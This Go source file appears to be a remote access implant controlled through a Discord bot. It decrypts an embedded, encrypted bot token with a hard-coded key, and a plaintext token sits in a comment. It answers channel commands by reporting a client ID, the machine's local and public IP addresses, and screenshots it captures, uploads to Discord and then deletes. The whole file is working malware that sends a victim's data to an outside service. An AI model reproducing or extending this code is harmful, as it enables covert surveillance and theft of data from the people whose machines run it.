package main

import (
	"os"
	"log"
	"fmt"
	"time"
	"syscall"
	"os/signal"
	"p0ggers/malfun"
	"github.com/google/uuid"
	"github.com/bwmarrin/discordgo"
	// "github.com/redcode-labs/Coldfire"
)

// "MTAyMDAzNjcyNjkzNDIyNDg5Ng.GNmtJ7.bW150vRIwr7LuDbxL_mz15eMmwLS5CsEtachV8"
var (
	CORDTKN = "O9HLxNsvzbrMu/7YIAR2cJHSj0kpDv1A/IIJ5vzwJPFiZ3NC8z811EgS81mVOEwsTd4k6HhV11TF3/IeNkR2TjdMpHVGZswu5ijE4Om8nTuNdjArtOgWEA"
	CID string
	PREFIX 	= "+"
)

func gID() string {
	id, err := uuid.NewRandom()
	if err != nil {
		fmt.Println("Could not generate unique ID using default")
		return "FUCK"
	}
	return id.String()
}

func rmF(fileName string) {
	time.Sleep(15 * time.Second)
	err := os.Remove(fileName)
	if err != nil {
		fmt.Println("Unable to remove the file: " + fileName)
		fmt.Println(err)
		return
	}
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == PREFIX+"check" {
		s.ChannelMessageSend(m.ChannelID, "Connection From: " + CID)
	}

	if m.Content == PREFIX+"glp" {
		ip := malfun.GLP()
		s.ChannelMessageSend(m.ChannelID, ip)
	}

	if m.Content == PREFIX+"ggp" {
		ip := malfun.GGP()
		s.ChannelMessageSend(m.ChannelID, ip)
	}

	if m.Content == PREFIX+"screen" {
		imgid := gID()
		snapshotName := malfun.SCREEN(imgid)
		snapshotData, err := os.OpenFile(snapshotName, os.O_RDWR, 0644)
		if err != nil {
			fmt.Println("Unable to open the specified file ", err)
		} 
		s.ChannelFileSend(m.ChannelID, snapshotName, snapshotData)
		defer snapshotData.Close()
		go rmF(snapshotName)
	}
}

func main() {
	CID = gID() // CLIENT ID

	key := []byte("AB1g4ssBuNnyJumPingUpTheHillBill")
	result, err := malfun.DECPT(key, CORDTKN)
    if err != nil {
        log.Fatal(err)
    }

	cord, err := discordgo.New("Bot " + result)
	if err != nil {
		fmt.Println("Error creating Discord session,", err)
		return
	}

	cord.AddHandler(messageCreate)

	cord.Identify.Intents = discordgo.IntentsGuildMessages

	err = cord.Open()
	if err != nil {
		fmt.Println("Error opening connection,", err)
		return
	}

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	cord.Close()
}